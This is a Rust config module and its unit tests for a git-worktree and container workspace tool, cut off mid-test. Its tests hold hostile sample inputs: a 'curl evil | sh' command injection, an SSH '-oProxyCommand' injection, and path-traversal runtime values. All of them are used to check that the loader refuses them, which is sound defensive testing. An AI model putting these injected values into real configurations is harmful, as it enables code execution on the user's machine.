use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

#[derive(Deserialize, Serialize, Default, schemars::JsonSchema)]
pub struct WsConfig {
    #[serde(skip_serializing_if = "Option::is_none", default, rename = "$schema")]
    pub schema: Option<String>,
    /// Private TLD for per-worktree hostnames, e.g. `myapp.test`; top-level because routing applies to local and remote alike.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub domain: Option<String>,
    /// Container runtime for `ws`'s own calls; absent → detected on this machine's PATH (see `runtime`).
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub runtime: Option<String>,
    /// Remote-offload block; absent → the workspace runs locally.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub remote: Option<RemoteConfig>,
    #[serde(default)]
    pub repos: Vec<RepoEntry>,
}

/// Remote-offload block; when present, every repo's stack runs on the server and location-transparent ops target it.
#[derive(Deserialize, Serialize, schemars::JsonSchema)]
pub struct RemoteConfig {
    /// SSH host to reach the server.
    pub connection: String,
    /// Parent dir on the server holding the synced worktrees; relative paths resolve against the SSH login home.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace_path: Option<String>,
    /// Address the server's Caddy publishes on; omitted → all interfaces, since offload's point is that another machine reaches it. Only read when Caddy is created; changing it recreates the container on the next `ws up`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub publish_address: Option<String>,
}

impl RemoteConfig {
    pub fn new(connection: String, workspace_path: Option<String>) -> Self {
        // `publish_address` stays unset: all-interfaces is the working default; pinning one is a deliberate narrowing.
        Self { connection, workspace_path, publish_address: None }
    }

    /// The server-side parent dir: configured `workspace_path`, else the workspace's own directory name.
    pub fn worktree_base(&self, ws_root: &Path) -> String {
        self.workspace_path.clone().unwrap_or_else(|| default_worktree_base(ws_root))
    }
}

/// Rewrite a `.ws-hooks/`-prefixed command to run under `$WS_WORKSPACE_ROOT` so it resolves the same locally and on the server; the var is quoted to survive spaces.
pub fn anchor_ws_hooks(cmd: &str) -> String {
    match cmd.strip_prefix(".ws-hooks/") {
        Some(rest) => format!("\"$WS_WORKSPACE_ROOT\"/.ws-hooks/{rest}"),
        None => cmd.to_string(),
    }
}

/// Default server-side worktree base: the workspace's own directory name so two projects on one server don't collide.
pub fn default_worktree_base(ws_root: &Path) -> String {
    ws_root
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "workspace".to_string())
}

/// A repo entry is a bare name or an object with overrides.
#[derive(Deserialize, Serialize, schemars::JsonSchema)]
#[serde(untagged)]
pub enum RepoEntry {
    Name(String),
    Extended(RepoConfig),
}

#[derive(Deserialize, Serialize, schemars::JsonSchema, Default)]
pub struct RepoConfig {
    pub name: String,
    /// `None` → inferred (compose file present ⇒ `Container`, else `Host`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kind: Option<RepoKind>,
    /// Routing + per-service ports; auto-derived from `<runtime> compose config` for a compose repo (this is the override layer), required for a host repo.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub services: BTreeMap<String, ServiceConfig>,
    /// Lifecycle commands keyed by event; supersedes `.ws-hooks/`. Most run where the stack lives; `prepare` runs on the client even when offloading so it can stage local-only data before the up flush carries it to the server. `BTreeMap` for deterministic rewrites — `.ws.json` isn't gitignored.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub scripts: BTreeMap<String, Script>,
    /// Env-var injection: your var name → a `${WS_*}` template. A sibling's `${WS_HOST_<repo>.<svc>}` from an unbuilt peer leaves the token literal. `BTreeMap` for deterministic injection order.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub env: BTreeMap<String, String>,
    /// Format-blind config templates: committed `src` rendered to gitignored `dest` with `${WS_*}` tokens substituted.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub templates: Vec<Template>,
    /// Untracked files seeded verbatim from the main checkout into each new worktree at `ws new`, before post-create and any remote sync. No-clobber; unmatched sources are skipped. The lane for dev certs/keys/env not in git.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub copy: Vec<String>,
    /// Per-worktree git-exclude entries appended to <wt>/.git/info/exclude.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub worktree_excludes: Vec<String>,
}

#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone, Copy, PartialEq, Eq, Debug)]
#[serde(rename_all = "lowercase")]
pub enum RepoKind {
    /// Compose stack; N copies de-conflicted via a generated compose override.
    Container,
    /// Host process supervised as a detached `ws`-owned process — no systemd/launchd.
    Host,
}

#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone)]
pub struct ServiceConfig {
    /// A string is the subdomain (`"api"` → `<branch>.api.<domain>`); `true` uses the service name; absent/`false` means raw TCP with an allocated `WS_PORT_<service>`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub http: Option<HttpDecl>,
    pub port: u16,
    /// **Not yet implemented — accepted and currently ignored.** Every service is per-worktree today; the field is documented because the generated schema is what users read.
    #[serde(default, skip_serializing_if = "is_false")]
    pub shared: bool,
    /// Also route every subdomain of this service's host to it so a multi-tenant app addressed as `<tenant>.<branch>.<subdomain>.<domain>` resolves for any `<tenant>`; HTTP only.
    #[serde(default, skip_serializing_if = "is_false")]
    pub wildcard: bool,
}

impl RepoConfig {
    /// Explicit `kind` wins; otherwise inferred from a lazily-checked compose file.
    pub fn is_container(&self, has_compose: impl FnOnce() -> bool) -> bool {
        match self.kind {
            Some(RepoKind::Container) => true,
            Some(RepoKind::Host) => false,
            None => has_compose(),
        }
    }

    /// Deliberately requires **explicit** `kind: host` — supervision changes how `up` runs, so it's opt-in (contrast `is_container`).
    pub fn is_host(&self) -> bool {
        matches!(self.kind, Some(RepoKind::Host))
    }
}

impl ServiceConfig {
    /// The HTTP subdomain label, or `None` for a raw-TCP service.
    pub fn subdomain<'a>(&'a self, service_name: &'a str) -> Option<&'a str> {
        match &self.http {
            Some(HttpDecl::Subdomain(s)) => Some(s),
            Some(HttpDecl::Enabled(true)) => Some(service_name),
            _ => None,
        }
    }

    pub fn is_http(&self) -> bool {
        matches!(self.http, Some(HttpDecl::Subdomain(_)) | Some(HttpDecl::Enabled(true)))
    }
}

#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone)]
#[serde(untagged)]
pub enum HttpDecl {
    Subdomain(String),
    /// `true` → route as HTTP with the service name as the subdomain; `false` → not HTTP.
    Enabled(bool),
}

#[derive(Deserialize, Serialize, schemars::JsonSchema)]
#[serde(untagged)]
pub enum Script {
    One(String),
    Many(Vec<String>),
}

impl Script {
    pub fn commands(&self) -> &[String] {
        match self {
            Script::One(s) => std::slice::from_ref(s),
            Script::Many(v) => v,
        }
    }

    /// `Many` runs as `cmd1 && cmd2 …` (fail-fast). `.ws-hooks/…` refs are anchored here so every consumer — local run, remote dispatch, `capture_action` status probe — agrees on the resolution.
    pub fn joined(&self) -> String {
        self.commands().iter().map(|c| anchor_ws_hooks(c)).collect::<Vec<_>>().join(" && ")
    }
}

#[derive(Deserialize, Serialize, schemars::JsonSchema)]
pub struct Template {
    pub src: String,
    pub dest: String,
}

fn is_false(b: &bool) -> bool {
    !*b
}

/// Runtimes `ws` drives, in detection-preference order.
pub const RUNTIMES: [&str; 2] = ["docker", "podman"];

/// Runtime used when detection finds nothing — the value `.ws.json` carried before detection existed, and what `server-setup` installs.
const RUNTIME_FALLBACK: &str = "podman";

/// Container runtime on this machine's PATH (docker first). Probed once per process — PATH can't meaningfully change underneath a single run.
pub fn detect_runtime() -> Option<&'static str> {
    static DETECTED: std::sync::OnceLock<Option<&'static str>> = std::sync::OnceLock::new();
    *DETECTED.get_or_init(|| RUNTIMES.into_iter().find(|r| on_path(r)))
}

/// Deliberately not a preflight — flows that never spawn a runtime (e.g. `ws setup` with no `domain`) must stay a no-op. Called at the actual spawn sites, so a bare `No such file or directory` becomes a real explanation.
pub fn ensure_available(runtime: &str) -> Result<()> {
    if on_path(runtime) {
        return Ok(());
    }
    // The two cases want different advice: nothing installed → "install one"; a pin naming something absent → "fix the pin".
    match detect_runtime() {
        None => anyhow::bail!(
            "no container runtime found — `ws` drives {}. Install one, or set \
             `runtime` in .ws.json if yours is under another name.",
            RUNTIMES.join(" or ")
        ),
        Some(found) => anyhow::bail!(
            "`{runtime}` isn't on PATH, but `{found}` is. Either install `{runtime}` \
             or change `runtime` in .ws.json."
        ),
    }
}

/// Asks the same question the spawn will (`Command` against PATH) rather than reading `$PATH`, so a shell alias or PATH quirk can't make the two disagree.
fn on_path(bin: &str) -> bool {
    std::process::Command::new(bin)
        .arg("--version")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

impl WsConfig {
    /// Configured runtime, else detected, else the fallback. Infallible so call sites that only *name* it (hook env, error messages) keep rendering with neither installed; actual spawns go through [`ensure_available`].
    pub fn runtime(&self) -> &str {
        if let Some(r) = self.runtime.as_deref() {
            return r;
        }
        // Detection reads the *client's* PATH, which says nothing about the server; a remote workspace keeps the fallback until pinned.
        if self.remote.is_some() {
            return RUNTIME_FALLBACK;
        }
        detect_runtime().unwrap_or(RUNTIME_FALLBACK)
    }


    /// Extended config for `repo`, if it's an object entry.
    pub fn repo_config(&self, repo: &str) -> Option<&RepoConfig> {
        self.repos.iter().find(|r| r.name() == repo).and_then(|r| r.config())
    }

    pub fn is_host_repo(&self, repo: &str) -> bool {
        self.repo_config(repo).map(RepoConfig::is_host).unwrap_or(false)
    }

    /// Explicit `kind: container`, else a compose file present in `worktree`; a bare-name repo is inferred the same way.
    pub fn is_container_repo(&self, repo: &str, worktree: &Path) -> bool {
        let has = || crate::compose::has_compose_file(worktree);
        match self.repo_config(repo) {
            Some(rc) => rc.is_container(has),
            None => has(),
        }
    }

    /// Repo's `scripts[event]` joined fail-fast (`cmd1 && cmd2`); the single owner shared by the host-repo launch path and every remote-dispatch caller.
    pub fn script_command(&self, repo: &str, event: &str) -> Option<String> {
        self.repo_config(repo).and_then(|rc| rc.scripts.get(event)).map(Script::joined)
    }

    /// Declared `scripts` entry, else the container default when `is_container` — the bare-string counterpart to [`crate::hooks::resolve`] for the paths that never ran a hook file.
    pub fn command_for(&self, repo: &str, event: &str, is_container: bool) -> Option<String> {
        self.script_command(repo, event)
            .or_else(|| is_container.then(|| default_script(self.runtime(), event)).flatten())
    }

    /// A `domain` is configured; routing runs wherever the stack lives.
    pub fn routing_active(&self) -> bool {
        self.domain.is_some()
    }
}

impl RepoEntry {
    pub fn name(&self) -> &str {
        match self {
            RepoEntry::Name(s) => s,
            RepoEntry::Extended(c) => &c.name,
        }
    }

    pub fn config(&self) -> Option<&RepoConfig> {
        match self {
            RepoEntry::Name(_) => None,
            RepoEntry::Extended(c) => Some(c),
        }
    }

    pub fn worktree_excludes(&self) -> &[String] {
        match self {
            RepoEntry::Name(_) => &[],
            RepoEntry::Extended(c) => &c.worktree_excludes,
        }
    }

    pub fn copy(&self) -> &[String] {
        match self {
            RepoEntry::Name(_) => &[],
            RepoEntry::Extended(c) => &c.copy,
        }
    }
}

/// Compose-lifecycle fallback for a container repo with no declared script; `post-remove` uses `down -v` because the worktree's volumes are `ws`-namespaced and a plain `down` would orphan them (recreating the branch would silently reuse stale data). `runtime` is `shell_quote`d because these run via `sh -c` from a possibly-cloned `.ws.json`.
pub fn default_script(runtime: &str, event: &str) -> Option<String> {
    let args = match event {
        "up" => "compose up -d",
        "down" => "compose down",
        "status" => "compose ps -q | wc -l",
        "post-remove" => "compose down -v",
        _ => return None,
    };
    Some(format!("{} {args}", crate::remote::shell_quote(runtime)))
}

/// Whether `runtime` is safe to hand to the process spawner as a program name.
///
/// `.ws.json` isn't gitignored, so this value arrives with a clone, and it is
/// executed directly — `Site::command` / the compose calls pass it as `argv[0]`,
/// and Rust runs any program string containing `/` as a path **relative to the
/// process cwd**, i.e. the very workspace the hostile config came in. A clone
/// carrying `{"runtime": ".ws-hooks/helper"}` plus a committed, executable
/// `.ws-hooks/helper` would run it on the first `ws setup` / `ws remote check`,
/// before any prompt. `shell_quote` is no defence: the value *is* the program,
/// not a shell word.
///
/// So: a bare program name, resolved through `PATH` (`podman`, `docker`,
/// `nerdctl`, `podman-remote`, …), or an absolute path to a binary. Deliberately
/// not an allow-list of two names — people do run other runtimes — the point is
/// only that a cloned config can't name a program inside the clone.
fn runtime_looks_safe(runtime: &str) -> bool {
    // Whitespace/control chars can't appear in a real program name, and rejecting
    // them keeps a hostile value from smuggling escape sequences into output.
    if runtime.is_empty()
        || runtime.starts_with('-')
        || runtime.chars().any(|c| c.is_whitespace() || c.is_control())
    {
        return false;
    }
    let Some(path) = runtime.strip_prefix('/') else {
        return !runtime.contains('/'); // bare name → PATH resolves it
    };
    // An absolute path is trusted, but `/proc/self/cwd/...` is an absolute path
    // that resolves straight back into the clone, and `..` climbs anywhere, so
    // neither counts as one.
    let parts: Vec<&str> = path.split('/').collect();
    parts.first() != Some(&"proc")
        && parts.iter().all(|p| !p.is_empty() && *p != "." && *p != "..")
}

/// Load a workspace config from `<workspace-root>/.ws.json`.
pub fn load(root: &Path) -> Result<WsConfig> {
    let path = root.join(".ws.json");
    let cfg: WsConfig = read_json(&path)?;
    refuse_legacy_hooks_field(&path)?;
    // Reject a dangerous SSH destination at the choke point every op shares — `.ws.json` isn't gitignored, so a clone could carry a hostile `-oProxyCommand=…`.
    if let Some(r) = &cfg.remote {
        if !crate::remote::connection_looks_safe(&r.connection) {
            anyhow::bail!(
                "refusing an unsafe remote.connection `{}` in .ws.json — an SSH host \
                 must not start with `-` (it would be parsed as an ssh option)",
                r.connection
            );
        }
        // Checked at load so a typo surfaces on any command, not just the one that brings routing up. A hostname is refused too: it could resolve elsewhere later and silently move where the server publishes.
        if let Some(a) = r.publish_address.as_deref().map(str::trim).filter(|a| !a.is_empty()) {
            match a.parse::<std::net::IpAddr>() {
                Ok(ip) if ip.is_multicast() => anyhow::bail!(
                    "remote.publish_address `{a}` in .ws.json is a multicast address — \
                     give an address of the server itself"
                ),
                Err(_) => anyhow::bail!(
                    "remote.publish_address `{a}` in .ws.json is not an IP address — \
                     give the server's tailnet/LAN address, or omit it to publish on all"
                ),
                Ok(_) => {}
            }
        }
    }
    // Same choke point, same reason as `remote.connection`: the value comes from
    // a possibly-cloned `.ws.json` and is executed. See `runtime_looks_safe`.
    if let Some(rt) = cfg.runtime.as_deref() {
        if !runtime_looks_safe(rt) {
            anyhow::bail!(
                "refusing an unsafe runtime `{rt}` in .ws.json — the container runtime must \
                 be a bare program name (`podman`, `docker`) or an absolute path to one; a \
                 relative path would run a program out of the repo this config arrived in"
            );
        }
    }
    Ok(cfg)
}

// Migration shim: DELETE with `hooks::refuse_legacy_hook_file`. `RepoConfig.hooks`
// was silently parseable and would be dropped on the next `ws remote set` rewrite;
// name it at load instead so a leftover block can't erase a user's config.

/// Refuse a `.ws.json` still carrying a repo's `hooks` override map.
fn refuse_legacy_hooks_field(path: &Path) -> Result<()> {
    let raw = std::fs::read_to_string(path).unwrap_or_default();
    // Cheap gate — `".ws-hooks/…"` script values don't have the bare-key quote pattern, so the reparse stays rare.
    if !raw.contains("\"hooks\"") {
        return Ok(());
    }
    let Ok(v) = serde_json::from_str::<serde_json::Value>(
        raw.strip_prefix('\u{feff}').unwrap_or(&raw),
    ) else {
        return Ok(()); // `read_json` will surface the parse error.
    };
    let stale: Vec<&str> = v["repos"]
        .as_array()
        .map(|repos| {
            repos
                .iter()
                .filter(|r| r["hooks"].is_object())
                .filter_map(|r| r["name"].as_str())
                .collect()
        })
        .unwrap_or_default();
    if stale.is_empty() {
        return Ok(());
    }
    anyhow::bail!(
        "`hooks` in {} ({}) points at the hook-file mechanism removed in ws 0.6 — move each \
         entry into that repo's `scripts` block instead. The contract changed with it: a script \
         runs with cwd = the worktree (not the workspace root), and the worktree path arrives as \
         $WS_WORKTREE (not $1).",
        path.display(),
        stale.join(", "),
    )
}

/// Machine-global `ws` config dir: `$XDG_CONFIG_HOME/ws/` or `~/.config/ws/`.
pub fn global_dir() -> PathBuf {
    if let Ok(x) = std::env::var("XDG_CONFIG_HOME") {
        if !x.is_empty() {
            return PathBuf::from(x).join("ws");
        }
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
    PathBuf::from(home).join(".config").join("ws")
}

/// Cross-workspace defaults at `~/.config/ws/config.toml`. `deny_unknown_fields` because `ws config set` rewrites the whole file — a silently-parsed unknown key (typo, or a section a newer `ws` wrote before a downgrade) would be silently dropped on next write.
#[derive(Deserialize, Serialize, Default)]
#[serde(deny_unknown_fields)]
pub struct GlobalConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    remote: Option<GlobalRemote>,
}

#[derive(Deserialize, Serialize, Default)]
#[serde(deny_unknown_fields)]
struct GlobalRemote {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    host: Option<String>,
}

/// Every key `ws config` understands.
pub const GLOBAL_KEYS: &[&str] = &["remote.host"];

fn unknown_key(key: &str) -> anyhow::Error {
    anyhow::anyhow!("unknown config key `{key}` — known keys: {}", GLOBAL_KEYS.join(", "))
}

impl GlobalConfig {
    pub fn path() -> PathBuf {
        global_dir().join("config.toml")
    }

    /// Missing file is empty; malformed is an error — never silently drop a user's edits.
    pub fn load() -> Result<Self> {
        let p = Self::path();
        let raw = match std::fs::read_to_string(&p) {
            Ok(s) => s,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Self::default()),
            Err(e) => return Err(e).with_context(|| format!("read {}", p.display())),
        };
        toml::from_str(&raw).with_context(|| format!("parse {}", p.display()))
    }

    pub fn save(&self) -> Result<()> {
        let dir = global_dir();
        std::fs::create_dir_all(&dir).with_context(|| format!("create {}", dir.display()))?;
        let s = toml::to_string_pretty(self).context("serialize global config")?;
        std::fs::write(Self::path(), s).with_context(|| format!("write {}", Self::path().display()))
    }

    pub fn get(&self, key: &str) -> Result<Option<&str>> {
        match key {
            "remote.host" => Ok(self.remote_host()),
            _ => Err(unknown_key(key)),
        }
    }

    pub fn set(&mut self, key: &str, value: &str) -> Result<()> {
        match key {
            "remote.host" => {
                // Same guard as `.ws.json`'s remote.connection — this value lands as an ssh argv element.
                crate::remote::ensure_connection_safe(value)?;
                self.remote.get_or_insert_with(Default::default).host = Some(value.to_string());
            }
            _ => return Err(unknown_key(key)),
        }
        Ok(())
    }

    /// Returns whether it was set.
    pub fn unset(&mut self, key: &str) -> Result<bool> {
        match key {
            // `host` is [remote]'s only field, so unsetting it drops the whole section — no bare `[remote]` header lingers. Revisit when a second key lands.
            "remote.host" => Ok(self.remote.take().is_some_and(|r| r.host.is_some())),
            _ => Err(unknown_key(key)),
        }
    }

    pub fn remote_host(&self) -> Option<&str> {
        self.remote.as_ref().and_then(|r| r.host.as_deref())
    }
}

/// Pretty JSON with a trailing newline — the single home for the on-disk JSON style `ws` writes.
pub fn write_json_pretty<T: Serialize>(path: &Path, value: &T) -> Result<()> {
    let s = serde_json::to_string_pretty(value)?;
    std::fs::write(path, format!("{s}\n")).with_context(|| format!("write {}", path.display()))
}

fn read_json<T: for<'de> Deserialize<'de>>(p: &Path) -> Result<T> {
    let raw = std::fs::read_to_string(p)
        .with_context(|| format!("read {}", p.display()))?;
    // Strip a leading UTF-8 BOM — Windows editors + `git core.autocrlf` can materialize one, and serde_json otherwise reports the opaque `expected value at line 1 column 1`.
    let trimmed = raw.strip_prefix('\u{feff}').unwrap_or(&raw);
    serde_json::from_str(trimmed).with_context(|| format!("parse {}", p.display()))
}

#[cfg(test)]
mod tests {
    use super::anchor_ws_hooks;

    #[test]
    fn anchor_ws_hooks_prefixes_only_a_ws_hooks_reference() {
        assert_eq!(
            anchor_ws_hooks(".ws-hooks/up.sh"),
            "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/up.sh"
        );
        assert_eq!(
            anchor_ws_hooks(".ws-hooks/db/seed.sh --fresh"),
            "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/db/seed.sh --fresh"
        );
        assert_eq!(anchor_ws_hooks("podman compose up -d"), "podman compose up -d");
        assert_eq!(anchor_ws_hooks("echo .ws-hooks/x"), "echo .ws-hooks/x");
    }

    #[test]
    fn container_defaults_cover_the_compose_lifecycle() {
        assert_eq!(default_script("podman", "up").as_deref(), Some("podman compose up -d"));
        assert_eq!(default_script("docker", "down").as_deref(), Some("docker compose down"));
        assert_eq!(
            default_script("podman", "status").as_deref(),
            Some("podman compose ps -q | wc -l")
        );
        assert_eq!(
            default_script("podman", "post-remove").as_deref(),
            Some("podman compose down -v")
        );
        assert_eq!(default_script("podman", "post-create"), None);
        assert_eq!(default_script("podman", "nonsense"), None);
    }

    #[test]
    fn default_script_quotes_a_hostile_runtime() {
        let s = default_script("podman; curl evil | sh #", "down").unwrap();
        assert!(s.starts_with("'podman; curl evil | sh #' compose down"), "{s}");
    }

    use super::*;

    fn write_cfg(dir: &Path, json: &str) {
        std::fs::write(dir.join(".ws.json"), json).unwrap();
    }

    #[test]
    fn load_refuses_a_publish_address_that_isnt_an_address() {
        for bad in ["localhost", "1.2.3.4:8443", "0.0.0.0/0", "not-an-ip", "224.0.0.1"] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(
                dir.path(),
                &format!(
                    r#"{{"repos":[],"remote":{{"connection":"h","publish_address":"{bad}"}}}}"#
                ),
            );
            let err = match load(dir.path()) {
                Err(e) => e.to_string(),
                Ok(_) => panic!("expected {bad:?} to be refused"),
            };
            assert!(
                err.contains("publish_address"),
                "expected {bad:?} refused, got: {err}"
            );
        }
    }

    #[test]
    fn load_accepts_ipv4_ipv6_and_an_absent_publish_address() {
        for good in [r#","publish_address":"100.97.195.105""#, r#","publish_address":"fd7a::1""#, ""] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(
                dir.path(),
                &format!(r#"{{"repos":[],"remote":{{"connection":"h"{good}}}}}"#),
            );
            assert!(load(dir.path()).is_ok(), "expected {good:?} accepted");
        }
    }

    /// The migration shim (delete with it): a leftover `hooks` override map must
    /// be named, not parsed away — `ws remote set` rewrites this file, so a
    /// silently-ignored block would be silently deleted.
    #[test]
    fn load_refuses_a_leftover_hooks_override_map() {
        let dir = tempfile::tempdir().unwrap();
        write_cfg(dir.path(), r#"{"repos":[{"name":"api","hooks":{"up":".ws-hooks/api/up"}}]}"#);
        let err = load(dir.path()).err().expect("a `hooks` block must be refused").to_string();
        assert!(err.contains("`hooks`") && err.contains("api"), "{err}");
        assert!(err.contains("$WS_WORKTREE"), "the new worktree contract must be named: {err}");

        // A `.ws-hooks/…` *script* value is the supported lane — never mistaken
        // for the removed field by the cheap substring gate.
        write_cfg(dir.path(), r#"{"repos":[{"name":"api","scripts":{"up":".ws-hooks/api/up"}}]}"#);
        assert!(load(dir.path()).is_ok());
    }

    #[test]
    fn read_json_strips_utf8_bom() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(tmp.path(), "\u{feff}{\"repos\":[]}").unwrap();
        let cfg: WsConfig = read_json(tmp.path()).unwrap();
        assert!(cfg.repos.is_empty());
    }

    #[test]
    fn parses_top_level_domain_runtime_and_remote() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"domain":"myapp.test","repos":["api"],"remote":{"connection":"srv","workspace_path":"workspace"}}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        assert_eq!(cfg.domain.as_deref(), Some("myapp.test"));
        // Runtime absent on a remote workspace → the fallback, never this machine's PATH.
        assert_eq!(cfg.runtime(), "podman");
        let remote = cfg.remote.expect("remote block");
        assert_eq!(remote.connection, "srv");
        assert_eq!(remote.workspace_path.as_deref(), Some("workspace"));
    }

    #[test]
    fn load_rejects_an_option_shaped_remote_connection() {
        // A hostile `.ws.json` can arrive via a clone (not gitignored).
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"remote":{"connection":"-oProxyCommand=touch /tmp/pwned"},"repos":[]}"#,
        )
        .unwrap();
        let err = load(dir.path()).err().expect("load should reject the connection");
        assert!(
            err.to_string().contains("unsafe remote.connection"),
            "expected the load to reject an option-shaped connection: {err}"
        );
    }

    #[test]
    fn runtime_override_is_read() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".ws.json"), r#"{"runtime":"docker","repos":[]}"#).unwrap();
        assert_eq!(load(dir.path()).unwrap().runtime(), "docker");
    }

    /// Detection order is a contract: a box with both installed gets docker.
    #[test]
    fn detection_prefers_docker() {
        assert_eq!(RUNTIMES, ["docker", "podman"]);
        if let Some(found) = detect_runtime() {
            assert!(RUNTIMES.contains(&found), "detected {found}, which ws can't drive");
        }
    }

    /// An absent `runtime` resolves against this machine's PATH — meaningless for an offload server, so a remote workspace keeps the fallback.
    #[test]
    fn an_absent_runtime_detects_locally_but_not_remotely() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(".ws.json");

        std::fs::write(&path, r#"{"repos":[]}"#).unwrap();
        assert_eq!(load(dir.path()).unwrap().runtime(), detect_runtime().unwrap_or("podman"));

        std::fs::write(&path, r#"{"repos":[],"remote":{"connection":"srv"}}"#).unwrap();
        assert_eq!(load(dir.path()).unwrap().runtime(), "podman");
    }

    /// The two failure cases give different advice: nothing installed → install; a pin naming an absent binary → change the pin.
    #[test]
    fn ensure_available_explains_which_kind_of_missing_it_is() {
        let err = ensure_available("definitely-not-a-runtime").unwrap_err().to_string();
        match detect_runtime() {
            Some(found) => {
                assert!(err.contains(found), "should name the runtime that IS here: {err}");
                assert!(err.contains(".ws.json"), "should point at the pin: {err}");
            }
            None => assert!(err.contains("no container runtime found"), "{err}"),
        }
        // `git` stands in for a present binary — which runtimes exist is exactly the CI variable this test can't pin down, and `git` is a hard requirement of every `ws` command.
        assert!(ensure_available("git").is_ok());
    }

    #[test]
    fn load_refuses_a_runtime_that_isnt_a_program_name() {
        // The value is executed as `argv[0]`, and a cloned `.ws.json` can name a
        // program *inside the clone* — `.ws-hooks/helper` next to a committed,
        // executable helper runs on the first `ws setup`, before any prompt.
        for bad in [
            ".ws-hooks/setup-helper",
            "./payload",
            "../evil/podman",
            "sub/dir/podman",
            "/proc/self/cwd/.ws-hooks/setup-helper",
            "/usr/bin/../../tmp/payload",
            "-oProxyCommand=x",
            "podman --remote",
            "",
        ] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(dir.path(), &format!(r#"{{"runtime":"{bad}","repos":[]}}"#));
            let err = match load(dir.path()) {
                Err(e) => e.to_string(),
                Ok(_) => panic!("expected runtime {bad:?} to be refused"),
            };
            assert!(err.contains("unsafe runtime"), "expected {bad:?} refused, got: {err}");
        }
    }

    #[test]
    fn load_accepts_any_bare_or_absolute_runtime() {
        // Not an allow-list of two names: a bare name is PATH-resolved and an
        // absolute path is a deliberate choice the user made on their own machine.
        for good in ["podman", "docker", "nerdctl", "podman-remote", "/usr/local/bin/podman"] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(dir.path(), &format!(r#"{{"runtime":"{good}","repos":["api"]}}"#));
            let cfg = match load(dir.path()) {
                Ok(c) => c,
                Err(e) => panic!("expected runtime {good:?} accepted: {e}"),
            };
            assert_eq!(cfg.runtime(), good);
        }
    }

    #[test]
    fn parses_extended_repo_with_services_scripts_env_templates() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"repos":[{
                "name":"api","kind":"container",
                "services":{"app":{"http":"api","port":80},"mysql":{"port":3306},"redis":{"port":6379,"shared":true}},
                "scripts":{"post-create":["composer install","php artisan migrate"],"up":"docker compose up -d"},
                "env":{"APP_URL":"https://${WS_HOST_app}"},
                "templates":[{"src":"nginx.conf.tmpl","dest":"nginx.conf"}]
            }]}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        let repo = cfg.repos[0].config().expect("extended repo");
        assert_eq!(repo.kind, Some(RepoKind::Container));

        let app = &repo.services["app"];
        assert_eq!(app.port, 80);
        assert!(matches!(app.http, Some(HttpDecl::Subdomain(ref s)) if s == "api"));
        assert!(!app.shared);
        assert!(repo.services["mysql"].http.is_none());
        assert!(repo.services["redis"].shared);

        assert!(matches!(repo.scripts["post-create"], Script::Many(ref v) if v.len() == 2));
        assert!(matches!(repo.scripts["up"], Script::One(ref s) if s == "docker compose up -d"));
        assert_eq!(repo.env["APP_URL"], "https://${WS_HOST_app}");
        assert_eq!(repo.templates[0].src, "nginx.conf.tmpl");
        assert_eq!(repo.templates[0].dest, "nginx.conf");
    }

    #[test]
    fn http_true_and_bare_name_repo() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"repos":["web",{"name":"api","services":{"app":{"http":true,"port":8080}}}]}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        assert_eq!(cfg.repos[0].name(), "web");
        assert!(cfg.repos[0].config().is_none());
        let app = &cfg.repos[1].config().unwrap().services["app"];
        assert!(matches!(app.http, Some(HttpDecl::Enabled(true))));
    }

    #[test]
    fn global_config_set_get_unset_round_trip() {
        let mut g = GlobalConfig::default();
        assert_eq!(g.get("remote.host").unwrap(), None);

        g.set("remote.host", "srv").unwrap();
        assert_eq!(g.get("remote.host").unwrap(), Some("srv"));

        let toml_s = toml::to_string_pretty(&g).unwrap();
        assert!(toml_s.contains("[remote]") && toml_s.contains("host = \"srv\""));
        let back: GlobalConfig = toml::from_str(&toml_s).unwrap();
        assert_eq!(back.remote_host(), Some("srv"));

        // A typo'd hand-edit must refuse at parse — `save` rewrites the whole file, so a silently-ignored key would be silently dropped by the next `ws config set`.
